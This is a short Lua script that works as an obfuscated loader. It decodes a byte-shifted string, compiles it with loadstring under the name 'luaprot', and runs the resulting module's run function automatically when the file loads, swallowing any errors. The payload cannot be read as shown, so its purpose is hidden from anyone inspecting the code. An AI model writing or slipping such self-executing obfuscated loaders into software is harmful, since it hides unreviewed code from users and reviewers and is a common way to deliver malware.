local K = "xK9m2pL7qR"

local function D(s)
local o = {}
for i = 1, #s do
o[#o + 1] = string.char((string.byte(s, i) + #K) & 0xFF)
end
return table.concat(o)
end

local B = D("ZQr:nRL\132YsB\128lR`rmRT\128nM?\127db[\128cbLzV=c\132V<\130\128ca\092vmxW\128d<`:V\132[=W^[?X^c?WNc;W^W;Y^K;Wtm<ZqGG")

local function L()
local fn = loadstring(B, "@luaprot")
if not fn then
return
end

local ok, mod = pcall(fn, 0)
if ok and type(mod) == "table" then
pcall(function()
if mod.run then
mod.run()
end
end)
end
end

L()
